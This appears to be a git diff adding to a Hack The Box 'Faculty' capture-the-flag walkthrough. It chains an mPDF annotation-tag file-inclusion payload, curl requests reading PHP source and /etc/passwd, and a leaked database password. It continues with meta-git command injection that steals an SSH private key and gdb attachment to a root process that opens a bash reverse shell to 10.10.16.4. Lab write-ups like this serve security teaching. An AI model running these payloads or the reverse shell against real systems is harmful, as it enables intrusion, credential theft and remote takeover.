@@ -137,6 +137,10 @@ This might be luck / a bug, but after requesting `http://faculty.htb/admin/ajax.
 
 ![][admin-dashboard]
 
+I did login as student `85662050` first.
+
+## LFI
+
 I thought parameter `page` in the URL would lead to LFI, but it didn't work for me.
 
 Instead, the PDF generation is making an interesting request:
@@ -191,55 +195,90 @@ exiftool ~/downloads/OKgSro1pLe4QKlTsFBuWwYhvCm.pdf
 # Modify Date                     : 2022:07:12 15:10:07+01:00
 ```
 
-With this, we can request a local file thanks to the `object` tag:
+With this, we can request a local file thanks to the `annotation` tag:
 
 ```python
-PAYLOAD = '<h1>LFI</h1>'
+PAYLOAD = '<annotation file="{target}" content="{target}" icon="Graph" title="Attached File: {target}" pos-x="32" pos-y="32" />'.format(target=FILE)
+print(b64encode(quote_plus(quote_plus(PAYLOAD)).encode('utf-8')).decode('utf-8'), end="")
 ```
 
-## Annex
+This bug was [reported here][mpdf-lfi] on `IKEA.com`. At first I tried `<object>` and `<embed>` tags but they didn't seem to work.
 
-sqlmap -r /tmp/login.txt --level 5 --risk 3 --threads 4 --dbms mysql -p username -D information_schema -T PARTITIONS --dump
-Database: 
-Table: 
+The annotation seem to have failed too, Chrome and other web viewer failed to display it. Until I unpacked the PDF with:
 
-Database: information_schema
-Table: SQL_FUNCTIONS
+```shell
+binwalk -e lfi.pdf
+grep bash _lfi.pdf.extracted/45C
+# root:x:0:0:root:/root:/bin/bash
+# gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
+# developer:x:1001:1002:,,,:/home/developer:/bin/bash
+```
 
-Database: information_schema
-Table: FILES
+## User shell
 
-Database: information_schema
-Table: SYSTEM_VARIABLES
+Thanks to the recon, we already know the full path of the sources:
 
-Database: information_schema
-Table: ALL_PLUGINS
+```shell
+python payloads/download.py '/var/www/scheduling/admin/admin_class.php' > tmp/payload.txt
+curl -s -k -X $'POST'\
+    -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
+    -b $'PHPSESSID=m7ml0qagcuh29m63rj96o2f545' \
+    --data-binary $'pdf='"$(cat tmp/payload.txt)" \
+    $'http://faculty.htb/admin/download.php' > tmp/path.txt
+curl -i -s -k -X $'GET' -o lfi.pdf \
+    -b $'PHPSESSID=m7ml0qagcuh29m63rj96o2f545' \
+    $'http://faculty.htb/mpdf/tmp/'"$(cat tmp/path.txt | perl -pe 's#\s*##g')"
+```
 
-Database: information_schema
-Table: user_variables
+As usual (several machines use CMS from the same author), there are credentials in `db_connect`:
 
-Database: information_schema
-Table: PROCESSLIST
+```php
+$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
+```
 
-Database: information_schema
-Table: USER_PRIVILEGES
+This password is reused by `gbyolo`! :D
 
-Database: information_schema
-Table: CLIENT_STATISTICS
+## Compromising the "developer"
 
-Database: information_schema
-Table: GLOBAL_VARIABLES
+As `gbyolo`:
 
-Database: information_schema
-Table: SCHEMATA
+```shell
+sudo -l
+# User gbyolo may run the following commands on faculty:
+#     (developer) /usr/local/bin/meta-git
+```
 
-Database: information_schema
-Table: PLUGINS
+This `meta-git` has a known vulnerability:
 
-Database: information_schema
-Table: TABLES
+```shell
+cd /tmp
+sudo -u developer /usr/local/bin/meta-git clone 'test||id'
+# uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)
+sudo -u developer /usr/local/bin/meta-git clone 'test||cat /home/developer/.ssh/id_rsa'
+```
+
+The `cd /tmp` is important since you need read fs privileges to run the command.
+
+## Root
+
+The user "developer" has debugging capabilities:
+
+```shell
+groups
+# developer debug faculty
+ls -lah /usr/bin/gdb
+# -rwxr-x--- 1 root debug 8.1M Dec  8  2021 /usr/bin/gdb
+```
+
+So we can debug a root process with gdb:
+
+```shell
+gdb -p $(ps auxf | grep '^root.*python' | perl -ne 'm#root\s*(\d+)#g && print $1')
+# call (void)system("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.4/9999 0>&1'")
+```
 
 [admin-dashboard]: images/admin-dashboard.png
 [author-profile]: https://app.hackthebox.com/users/36994
 [faculty-login]: images/faculty-login.png
+[mpdf-lfi]: https://medium.com/@jonathanbouman/local-file-inclusion-at-ikea-com-e695ed64d82f
 [student-dashboard]: images/student-dashboard.png
